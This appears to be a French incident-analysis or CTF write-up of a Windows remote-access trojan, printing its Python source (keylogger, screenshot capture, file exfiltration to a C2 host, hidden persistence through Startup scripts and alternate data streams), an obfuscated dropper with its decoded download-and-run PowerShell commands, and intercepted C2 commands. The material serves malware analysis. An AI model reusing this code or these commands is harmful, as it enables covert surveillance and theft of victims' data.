    if not os.path.isfile('C:\\WinCache\\stage1.ps1'):
        with open('C:\\WinCache\\stage1.ps1', "w+") as f:
            f.write(stage1_ps1)
    if os.path.isfile("%s\\Downloads\\dropper.exe" %os.getenv('USERPROFILE')):
        powerstealth("rm %s\\Downloads\\dropper.exe" %os.getenv('USERPROFILE'))
    powerstealth('C:\\WinCache\\task.ps1')
    powerstealth('attrib +h /s /d C:\\WinCache')
    if not os.path.isfile(GIF_FILE):
        with open(GIF_FILE, 'wb') as f:
            r = requests.get('https://media.giphy.com/media/77er1c9H3KJnq/giphy.gif')
            f.write(r.content)

def package(filepath):
    temp_zip = tempfile.NamedTemporaryFile(delete=False)
    temp_gif = tempfile.NamedTemporaryFile(delete=False)
    with zipfile.ZipFile(temp_zip.name, "w") as f:
        f.write(filepath)
    with open(GIF_FILE, "rb") as gif_f:
        gif_content = gif_f.read()
        with open(temp_zip.name, "rb") as zip_f:
            zip_content = zip_f.read()
            with open(temp_gif.name+'.gif', "ab+") as out_f:
                out_f.write(gif_content)
                out_f.write(b'HIDDEN_CONTENT_SEPARATOR')
                out_f.write(zip_content)

def send(instruction, data=None):
    filename = encapsulate(dict(type=instruction, data=data))
    r = requests.post(C2+'/giphy/'+UID+'.gif', files=dict(payload=open(filename, 'rb')))

def on_keypress(event):
    with open(KEYLOG_PATH, 'a+') as f:
        if event.name == 'enter':
            f.write('\\r\x07)
        else:
            f.write("%s" %event.name)

def handle_instruction(instruction):
    if instruction.get('type') == 'EXECUTE' and instruction.get('data'):
        powerstealth(instruction.get('data'))
    elif instruction.get('type') == 'UPDATE':
        if os.path.isfile('C:\\WinCache\\stage1.py'):
            with open('C:\\WinCache\\stage1.py', "w+") as f:
                content = f.read()
                r = requests.get(C2+'/updates/KB4540673.msi')
                if content != r.content:
                    f.write(r.content.decode('utf-8'))
                    rm_pid()
                    ctypes.windll.shell32.ShellExecuteW(None, "",'powershell.exe' , '-windowstyle hidden C:\\WinCache\\stage1.ps1', None, 1)
                    exit()
    elif instruction.get('type') == 'DOWNLOAD':
        if os.path.isfile(instruction.get('data')):
            with open(instruction.get('data'), "rb") as f:
                send('UPLOAD', base64.b64encode(f.read()).decode("utf-8"))
    elif instruction.get('type') == 'SCREENSHOT':
        im = ImageGrab.grab()
        im.save(os.getenv('APPDATA')+'\\..\\Local\\'+'lastscreen.png')

async def ws_agent():
    global running
    async with websockets.connect(WS_URL+UID) as websocket:
        while running:
            data = await websocket.recv()
            message = decrypt(data)
            if DEBUG:
                print('Received', message)
            response = handle_instruction(json.loads(message))

            await websocket.send(encrypt(json.dumps(dict(type="PING", data="64646464646464"))))
            data = await websocket.recv()
            if DEBUG:
                print('decrypted [%s]' %decrypt(data))

def check_broad_instr():
    r = requests.get(C2+'/giphy/'+UID+'.gif')
    try:
        content = r.content.split(b'HIDDEN_CONTENT_SEPARATOR')[1]
        message = decrypt(content)
        if DEBUG:
            print('Decrypted broadcasted content', message)
        if len(message):
            instr = json.loads(message)
            handle_instruction(instr)
    except Exception as e:
        if DEBUG:
            print(e)
        pass

def main():
    global waiting, running
    try:
        if os.name == 'nt':
            elevate()
            post_exp()
            hide()
        check_broad_instr()            
        keyboard.on_release(callback=on_keypress)
        if DEBUG:
            print('keylogger started')
        if DEBUG:
            print('grabbed screen')
        im = ImageGrab.grab()
        im.save(os.getenv('APPDATA')+'\\..\\Local\\'+'lastscreen.png')
        slept = 0
        while running:
            if os.path.isfile(os.getenv('APPDATA')+'\\agent.pid'):
                waiting = True
            else:
                waiting = False
                with open(os.getenv('APPDATA')+'\\agent.pid', "a+") as f:
                    f.write(str(os.getpid()))
            if not waiting:
                asyncio.get_event_loop().run_until_complete(ws_agent())
            else:
                if slept >= 3:
                    rm_pid()
                    slept = 0
                else:
                    time.sleep(SLEEP_TIME)
                    slept += 1
    except Exception as e:
        if DEBUG:
            print(e)
        rm_pid()
        return 1
    return 0
cachés
if __name__ == "__main__":
    while True:
        try:
            main()
        except Exception as e:
            pass
        rm_pid()
        if DEBUG:
            print('Something went wrong... Going to sleep for %s' %SLEEP_TIME)
        time.sleep(SLEEP_TIME)

```

WOW, il y a plein de choses à dire :
* Le programme tourne dans une boucle infinie. Il est donc toujours actif.
* Le programme est multi-plateforme. Il a été créé pour Windows mais il fonctionne également sur d'autres systèmes en mode dégradé.
* Il y un système de [C&C](https://en.wikipedia.org/wiki/Command_and_control) avec le serveur 'microsoftonline.download/windowsupdates'. Ce serveur est appelé régulièrement et la victime exécute les commandes qu'elle reçoit. Elle exfiltre également des données.
* Le fichier `C:\\WinCache\\stage1.py` est mis à jour à la demande avec le contenu situé à l'url `http://microsoftonline.download/updates/KB4540673.msi`
* Un keylogger est démarré sur le système. Le fichier de log du keylogger se trouve à `C:\\Users\\myles\\AppData\\Local\\keys.log` sous windows et dans `/tmp/keys.log` pour les autres systèmes.
* Un screenlogger est démarré sur le système. Le dernier screenshot est sauvegardé ici : `C:\Users\myles\AppData\Local\lastscreen.png`
* Les commandes C&C possibles sont : EXECUTE, UPDATE, DOWNLOAD, SCREENSHOT
 * EXECUTE : Exécute une commande powershell
 * UPDATE : Met à jour le fichier stage1.py
 * DOWNLOAD : Upload le contenu du fichier demandé. Les informations exfiltrées se font sur `http://microsoftonline.download/giphy/3551-7893-6007.gif` (Methode POST)
 * SCREENSHOT : Crée un screenshot de l'écran
* L'identifiant de la victime se trouve ici `C:\Users\myles\AppData\Roaming\uid.txt`. Il est créé aléatoirement la première fois et sert à identifier la victime sur le serveur C&C.
* Sur une machine Windows, les fichiers `stage1.ps1` et `task1.ps1` sont créés s'ils n'existent pas. Ces 2 fichiers sont exécutés immédiatement.
* Le dossier `C:\WinCache` est "caché". Sur un explorateur de fichier classique, il deviendra donc invisible.
* Le fichier `C:\\Users\\myles\\Downloads\\dropper.exe` est supprimé. C'est ce fichier qui a dû être téléchargé par Myles et qui a lancé le malware la première fois. Ce malware se rend persistent de manière autonome.
* Le fichier `C:\\WinCache\\sanic.gif` est récupéré depuis `https://media.giphy.com/media/77er1c9H3KJnq/giphy.gif`
* Le fichier `C:\\Users\\myles\\Pictures\\wallpaper.jpeg` est récupéré depuis `https://images.pexels.com/photos/1054201/pexels-photo-1054201.jpeg?crop=entropy&cs=srgb&dl=pexels-stephan-seeber-1054201.jpg&fit=crop&fm=jpg&h=1280&w=1920`
* Le fichier `C:\\WinCache\\stage2.py` est récupéré depuis `https://gist.githubusercontent.com/lp1dev/03106728e2abba323efb1398b21a064f/raw/1ac2c8d3088d0d42ff50173e39963102bba9dbbc/stage2.py`
* Le contenu du fichier `C:\\WinCache\\vlc_updater.exe` est "inclu" dans le fichier `C:\\Users\\myles\\Pictures\\wallpaper.jpeg` sous forme de alternate data stream. (C:\\Users\\myles\\Pictures\\wallpaper.jpeg:py.exe)
* Le contenu du fichier `C:\\WinCache\\stage2.py` est "inclu" dans fichier `C:\\Users\\myles\\Pictures\\wallpaper.jpeg` sous forme de alternate data stream. (C:\\Users\\myles\\Pictures\\wallpaper.jpeg:stage2.py)
* La commande `wmic process call create "C:\\Users\\myles\\Pictures\\wallpaper.jpeg:py.exe C:\\Users\\myles\\Pictures\\wallpaper.jpeg:stage2.py"` est inclu dans `C:\\Users\\myles\\Pictures\\wallpaper.jpeg` sous forme de alternate data stream. (C:\\Users\\myles\\Pictures\\wallpaper.jpeg:run.ps1)
* Le fichier `C:\\Users\\myles\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\windefender.cmd` est créé avec le contenu `wmic process call create "C:\\Users\\myles\\Pictures\\wallpaper.jpeg:py.exe C:\\Users\\myles\\Pictures\\wallpaper.jpeg:stage2.py"`
* Le fichier `C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\windefender.cmd` est créé avec le contenu `wmic process call create "C:\\Users\\myles\\Pictures\\wallpaper.jpeg:py.exe C:\\Users\\myles\\Pictures\\wallpaper.jpeg:stage2.py"`
* Les instructions sont récupérées depuis le C&C en téléchargeant un fichier .gif ici `http://microsoftonline.download/giphy/3551-7893-6007.gif` (Methode GET). Ce fichier contient un contenu .gif et un contenu .zip séparé par b'HIDDEN_CONTENT_SEPARATOR' ou bien depuis un websocket.


#### Fichiers inclus : Alternate data stream
La technique des alternate data streams est utilisée pour cacher des données dans un fichier. (Ici `C:\Users\myles\Pictures\wallpaper.jpeg`)
```
PS C:\WinCache> Get-Item -path "C:\Users\myles\Pictures\wallpaper.jpeg" -stream *

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures\wallpaper.jpeg::$DATA
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures
PSChildName   : wallpaper.jpeg::$DATA
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\myles\Pictures\wallpaper.jpeg
Stream        : :$DATA
Length        : 539150

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures\wallpaper.jpeg:py.exe
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures
PSChildName   : wallpaper.jpeg:py.exe
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\myles\Pictures\wallpaper.jpeg
Stream        : py.exe
Length        : 16269935

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures\wallpaper.jpeg:run.ps1
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures
PSChildName   : wallpaper.jpeg:run.ps1
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\myles\Pictures\wallpaper.jpeg
Stream        : run.ps1
Length        : 121

PSPath        : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures\wallpaper.jpeg:stage2.py
PSParentPath  : Microsoft.PowerShell.Core\FileSystem::C:\Users\myles\Pictures
PSChildName   : wallpaper.jpeg:stage2.py
PSDrive       : C
PSProvider    : Microsoft.PowerShell.Core\FileSystem
PSIsContainer : False
FileName      : C:\Users\myles\Pictures\wallpaper.jpeg
Stream        : stage2.py
Length        : 1644

```
On retrouve bien 4 streams différents à l'intérieur de notre fichier :
* Le contenu de l'image elle-même
* Le contenu de py.exe
* Le contenu de run.ps1
* Le contenu de stage2.py

#### Keylogger
```
C:\Users\myles\Pictures>type C:\\Users\\myles\\AppData\\Local\\keys.log

uuaacc\r\rddoownnlloaaddspaceccrraacckkeeddspacespaceooffffiiccee\r\rspacespaceeeaassyy\r\raactrlctrlddoowwnnllooaaddspacespacelliibbrreeooffffiiccee\r\rwhaattspacespaceiisaactrlctrlwwhhyyspaceiissspacespaceccaallc..eexxeespacespaceoopeenniinnggspacespaceooppbackspacebackspacebackspacebackspaceuuppspacespaceoonspacespaceiittsseellFF??!!shiftshift\r\rjctrlctrlwwctrlctrlppppoooowwwweeerrrr\r\r\r\rGGGGshiftshiftshiftshiftGGGshiftshiftshiftshiftbackspacebackspacebackspacebackspaceeeeettttshiftshiftshift---shiftshiftshiftshifthhhhiiissstttttabtabtabtaboooobackspacebackspacebackspace\r\r\rCCCCshiftshiftshiftshiftllleeeeaaaarrr----shiftshiftshiftshifthhhhssssbackspacebackspacebackspaceiiiissssttttoooorrryyyy\r\r\raltaltaltaltctrlctrlctrlctrldeletedeletealtaltctrlctrldeletedeletealtaltctrlctrlvvvvllccllccshiftshiftshiftshiftdeletedeletedeletedeletedeletedeletedeletedeletedeletedeletedeletedeleterrleft windowsleft windowsrrrrrctrlctrlctrlctrlaltaltctrlctrldeletedeletealtaltctrlctrldeletedeletealtaltctrlctrldeletedeletedeletedeletectrlctrlctrlctrlctrlctrlctrlctrlctrlctrlctrldeletedeletedeletedeletedeletedeletedeletedeletedeletedeletedeleteddddddddddddddddddeeeeeeddeeeeeeeeeeeeeeeeefffffffffffffffffffffeeeeeeeeeeeeeeeeeeeennnnnnnnnnnnnnnnnnccccccccccccccccccccc;c;c;;;c;;ccc;;;c;;;;;;;;;;;;;;;;;ddddddddddddddddddddddddddddzzzzzzzzzzzzzzzzzzzzzzzzzzzzhhhhhhhhhhhhhhhhhhhhhhhhhhoohhohohooooooooooooooooooooooobackspacebackspacebackspacebackspacebackspacebackspacebackspacebackspacebackspacebackspacebackspacebackspacebackspace [...]
```
#### Screenshot
```
C:\>dir C:\Users\myles\AppData\Local\lastscreen.png

Directory of C:\Users\myles\AppData\Local

11/25/2020  06:59 AM           834,007 lastscreen.png
               1 File(s)        834,007 bytes
               0 Dir(s)  18,159,452,160 bytes free
```

#### Start Menu
```
C:\Users\myles>type "C:\Users\myles\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windefender.cmd"

wmic process call create "C:\Users\myles\Pictures\wallpaper.jpeg:py.exe C:\Users\myles\Pictures\wallpaper.jpeg:stage2.py"
```
```
C:\Users\myles>type "C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\\windefender.cmd"

wmic process call create "C:\Users\myles\Pictures\wallpaper.jpeg:py.exe C:\Users\myles\Pictures\wallpaper.jpeg:stage2.py"
```

#### Stage2.py
A priori, c'est bien ce fichier stage2.py qui est exécuté au démarrage.
Regardons d'un peu plus près..

```
S C:\WinCache> type C:\Users\myles\Pictures\wallpaper.jpeg:stage2.py
type C:\Users\myles\Pictures\wallpaper.jpeg:stage2.py
import base64
import codecs
exec(codecs.encode(base64.b64decode('dnpjYmVnIGJmCkg9YmNyYQpGPWJmLmZsZmdyegp2PWJmLmNuZ3UKdnMgYiWJnIHYudmZxdmUoIlA6XFxKdmFQbnB1ciIpOgogRihwYnFycGYucmFwYnFyKCdwb3dlcnNoZWxsIC13aW5kb3dzdHlsZSBoaWRkZW4gY2QgQzpcXDsgbWtkaXIgV2luQ2FjaGUnLCAnZWJnLTEzJykpCnZzIGFiZyB2LnZmc3Z5cihwYnFycGYucmFwYnFyKCdDOlxcV2luQ2FjaGVcXHN0YWdlMS5wczEnLCAnZWJnLTEzJykpOiAKIGp2Z3UgSChwYnFycGYucmFwYnFyKCdDOlxcV2luQ2FjaGVcXHN0YWdlMS5wczEnLCAnZWJnLTEzJyksJ2orJyluZiBzOgogIHMuamV2Z3IocGJxcnBmLnJhcGJxcigndHlwZSBDOlxcV2luQ2FjaGVcXHN0YWdlMS5weSB8IEM6XFxXaW5DYWNoZVxcdmxjX3VwZGF0ZXIuZXhlJywgJ2ViZy0xMycpKQp2cyBhYmcgdi52ZnN2eXIocGJxcnBmLnJhcGJxcignQzpcXFdpbkNhY2hlXFxzdGFnZTEucHknLCAnZWJnLTEzJykpOgogRihwYnFycGYucmFwYnFyKCdwb3dlcnNoZWxsIC13aW5kb3dzdHlsZSBoaWRkZW4gLWMgIkludm9rZS1XZWJSZXF1ZXN0IGh0dHBzOi8vZ2l0aHViLmNvbS9tYW50aGV5L3B5ZXhlL3JlbGVhc2VzL2Rvd25sb2FkL3YxOC9weTM3LTY0LmV4ZSAtT3V0RmlsZSBDOlxcV2luQ2FjaGVcXHZsY191cGRhdGVyLmV4ZTtJbnZva2UtV2ViUmVxdWVzdCBodHRwOi8vbWljcm9zb2Z0b25saW5lLmRvd25sb2FkL3VwZGF0ZXMvS0I0NTQwNjczLm1zaSAtT3V0RmlsZSBDOlxcV2luQ2FjaGVcXHN0YWdlMS5weSInLCAnZWJnLTEzJykpCnZzIGFiZyB2LnZmcXZlKHBicXJwZi5yYXBicXIoJ0M6XFxXaW5DYWNoZVxcQ3J5cHRvJywgJ2ViZy0xMycpKToKIEYocGJxcnBmLnJhcGJxcigncG93ZXJzaGVsbC5leGUgY2QgQzpcXFdpbkNhY2hlIDsgLlxcdmxjX3VwZGF0ZXIuZXhlIC1tIHBpcCBpbnN0YWxsIC0tbm8tY2FjaGUtZGlyIC0tdGFyZ2V0IC4gLS11cGdyYWRlIHB5Y3J5cHRvZG9tZSByZXF1ZXN0cyB3ZWJzb2NrZXRzIHB5c2NyZWVuc2hvdCBwaWxsb3cga2V5Ym9hcmQnLCAnZWJnLTEzJykpCkYocGJxcnBmLnJhcGJxcigncG93ZXJzaGVsbC5leGUgQzpcXFdpbkNhY2hlXFxzdGFnZTEucHMxJywgJ2ViZy0xMycpKQojIFBlcm5ncnEgb2wgY2x6dmF2c3ZyZSAodWdnY2Y6Ly90dmd1aG8ucGJ6L3l2c2dic3MvY2x6dmF2c3ZyZSkKCg==').decode('utf-8'), 'rot-13'))
```

Une fois désobfusqué :
```
import base64
import codecs
import os

if not path.isdir("C:\\WinCache"):
 system('powershell -windowstyle hidden cd C:\\; mkdir WinCache')

if not path.isfile('C:\\WinCache\\stage1.ps1'):
 with open('C:\\WinCache\\stage1.ps1','w+')as f:
  f.write('type C:\\WinCache\\stage1.py | C:\\WinCache\\vlc_updater.exe')

if not path.isfile('C:\\WinCache\\stage1.py'):
 system('powershell -windowstyle hidden -c "Invoke-WebRequest https://github.com/manthey/pyexe/releases/download/v18/py37-64.exe -OutFile C:\\WinCache\\vlc_updater.exe;Invoke-WebRequest http://microsoftonline.download/updates/KB4540673.msi -OutFile C:\\WinCache\\stage1.py"')

if not path.isdir('C:\\WinCache\\Crypto'):
 system('powershell.exe cd C:\\WinCache ; .\\vlc_updater.exe -m pip install --no-cache-dir --target . --upgrade pycryptodome requests websockets pyscreenshot pillow keyboard')

system('powershell.exe C:\\WinCache\\stage1.ps1')
# Created by pyminifier (https://github.com/liftoff/pyminifier)
```

#### Résumé
A chaque démarrage de session stage2.py est lancé. Il créé l'arborescence de `C:\WinCache`, récupère les fichiers stage1.ps1, stage1.py et installe les dépendances. Suite à cela, stage1.ps1 est lancé.

Lorsque stage1.ps1 se lance il exécute stage1.py.

A l'exécution de stage1.py, le malware se lance en tâche de fond et tourne tant que la session est démarrée. En plus, il tente de se persister avec des tâches programmées au niveau du système.

Au démarrage on a donc au minimum:
* 1 processus vlc_updater.exe démarré par `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\windefender.cmd`
* 1 processus vlc_updater.exe démarré par `C:\Users\myles\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\windefender.cmd`
* 1 processus vlc_updater.exe démarré par la tâche programmée (task1.ps1)

### Réseau
On analyse les connexions réseaux :
```
Active Connections

  Proto  Local Address          Foreign Address        State
  TCP    127.0.0.1:49705        DESKTOP-8DK0CQ3:49706  ESTABLISHED
  TCP    127.0.0.1:49706        DESKTOP-8DK0CQ3:49705  ESTABLISHED
  TCP    127.0.0.1:49710        DESKTOP-8DK0CQ3:49711  ESTABLISHED
  TCP    127.0.0.1:49711        DESKTOP-8DK0CQ3:49710  ESTABLISHED
  TCP    192.168.1.16:49732     40.67.251.132:https    ESTABLISHED
  TCP    192.168.1.16:49786     192.168.1.34:4444      ESTABLISHED
  TCP    192.168.1.16:49803     192.168.1.34:4444      ESTABLISHED
  TCP    192.168.1.16:49845     192.168.1.34:4444      ESTABLISHED
  TCP    192.168.1.16:49993     199:http               TIME_WAIT
  TCP    192.168.1.16:49995     199:http               TIME_WAIT
  TCP    192.168.1.16:49997     199:http               TIME_WAIT
  TCP    192.168.1.16:49998     199:http               TIME_WAIT
  TCP    [2a01:e0a:1be:c5a0:8898:48b2:c17d:9018]:49717  g2a02-26f0-00ff-03a1-0000-0000-0000-4106:https  CLOSE_WAIT
  TCP    [2a01:e0a:1be:c5a0:8898:48b2:c17d:9018]:49718  g2a02-26f0-00ff-03a1-0000-0000-0000-4106:https  CLOSE_WAIT
  TCP    [2a01:e0a:1be:c5a0:8898:48b2:c17d:9018]:49989  [2606:4700::6811:d066]:https  TIME_WAIT
  TCP    [2a01:e0a:1be:c5a0:8898:48b2:c17d:9018]:49990  [2606:4700::6811:d066]:https  TIME_WAIT
```

Une connexion (`TCP    192.168.1.16:49732     40.67.251.132:https    ESTABLISHED`) semble étrange.
Après analyse du certificat, il s'agit de d'un certificat émit pour `*.wns.windows.com`. Fausse piste !


#### Interception des communications C&C
On sait que notre victime communique régulièrement avec le serveur C2.
Simulons une communication ws et regardons les commandes opérées par le serveur :


```
{"data" : "(New-Object System.Net.WebClient).DownloadFile('https://pastebin.com/raw/TfvZFScq', 'C:/Users/myles/AppData/Local/crypt.html') ; start shell:AppsFolder\\Microsoft.MicrosoftEdge_8wekyb3d8bbwe!MicrosoftEdge file:///C:/Users/myles/AppData/Local/crypt.html", "type" : "EXECUTE"}
{"type" : "SCREENSHOT"}
{"data" : "C:/Users/myles/AppData/Local/lastscreen.png", "type" : "DOWNLOAD"}
{"data" : "calc.exe", "type" : "EXECUTE"}
{"data" : "C:/Windows/System32/drivers/etc/hosts", "type" : "DOWNLOAD"}

```
On retrouve ici l'ensemble des "comportements bizarres" qui apparaissent sur la machine de Myles.
* Ouverture d'un pseudo ransomware (sous Edge)
* Prise d'une capture d'écran
* Exfiltration de la dernière capture d'écran
* Ouverture de la calculatrice
* Exfiltration du fichier hosts

### Conclusion
Après avoir forcé notre entrée, on constate bien que la machine de Myles a été compromise.
En creusant dans le système de fichiers, on peut voir les fichiers en cause, analyser les mécanismes mis en place par le ransomware et retracer son parcours.

Un classique Command & Control avec communication par websocket !
